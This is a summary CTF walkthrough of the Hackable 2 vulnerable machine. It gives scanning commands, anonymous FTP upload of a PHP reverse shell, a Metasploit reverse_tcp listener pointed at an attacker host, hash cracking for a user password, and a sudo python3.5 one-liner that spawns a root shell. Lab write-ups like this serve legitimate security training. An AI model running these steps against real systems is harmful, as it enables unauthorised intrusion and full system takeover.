# 🐉 Hackable 2 CTF – Summary Walkthrough  

A full text-based breakdown of the Hackable 2 vulnerable machine. This box showcases misconfigured FTP services, web shell upload, horizontal privilege escalation through exposed credentials, and abusing Python binary privileges for root access.  

## 🔍 Discovery  
- Ran `nmap` scans:  
nmap -sV -Pn <ip>
nmap -A <ip>

- Found open ports:  
- 21 (FTP – anonymous login enabled)  
- 22 (SSH)  
- 80 (HTTP – Apache web service)  

✅ Multiple exposed services provide several attack vectors.  

## 📂 Enumeration  
- Ran `gobuster` on port 80:  
gobuster dir -u http://<ip>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,log,php,html,bak,zip

- Discovered:  
- `/files`  
- `/index.html`  

- Checked FTP:  
ftp <ip>
Username: anonymous
Password: (blank)

✅ Anonymous login was allowed and confirmed write permissions.  

## ⚙️ Foothold  
- Uploaded PHP reverse shell via FTP into `/files`:  
put shell.php

- Set up listener with Metasploit:  
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT <port>
run

- Triggered the shell by visiting:  
http://<ip>/files/shell.php

✅ Meterpreter reverse shell established as `www-data`.  

## 💻 User Escalation (www-data → shrek)  
- Found `/home/important.txt` → referenced a script `runme.sh`.  
- Ran the script:  
./runme.sh

- Output contained a password hash for user `shrek`.  
- Cracked the hash using CrackStation → retrieved plaintext password.  
- Switched user:  
su shrek

✅ Access as user `shrek`.  

## 🔐 Privilege Escalation (shrek → root)  
- Checked sudo privileges:  
sudo -l

- Found user `shrek` could run **python3.5** as root without a password.  
- Exploited this by running:  
sudo /usr/bin/python3.5 -c 'import os; os.system("/bin/bash")'

✅ Root shell gained. 🎉  

---

📖 **Full walkthrough with screenshots:**  
👉 [View the Medium post here](https://medium.com/@basitolasubomibalogun/hackable-2-ctf-full-technical-walkthrough-e54effd80f50)
